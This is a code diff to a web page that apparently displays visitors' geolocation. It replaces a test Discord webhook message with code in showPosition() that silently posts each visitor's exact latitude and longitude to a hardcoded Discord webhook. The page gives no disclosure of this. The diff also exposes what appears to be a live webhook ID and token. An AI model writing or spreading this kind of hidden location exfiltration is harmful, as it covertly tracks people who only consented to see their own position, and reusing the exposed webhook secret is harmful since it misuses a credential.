@@ -10,13 +10,7 @@
 
 <script>
 
-var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://discord.com/api/webhooks/1255297754901647444/Oi0N8DLQ1ibD0Bjx4_eqWQLUevi_S5wZFPQ08Wenwzry7jPN6b4EjlmnN8gspTN2q0JJ", true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            'content': "TOP 5 UCU MOMENTOS",
-            'username':'AI',
-        }));
+
   
 const x = document.getElementById("demo");
 
@@ -31,6 +25,16 @@ function getLocation() {
 function showPosition(position) {
   x.innerHTML = "Latitude: " + position.coords.latitude + 
   "<br>Longitude: " + position.coords.longitude;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1255297754901647444/Oi0N8DLQ1ibD0Bjx4_eqWQLUevi_S5wZFPQ08Wenwzry7jPN6b4EjlmnN8gspTN2q0JJ", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            'content': "Latitude: " + position.coords.latitude + "   Longitude: " + position.coords.longitude ,
+            'username':'EPIC',
+        }));
+
+        
 }
 </script>
 
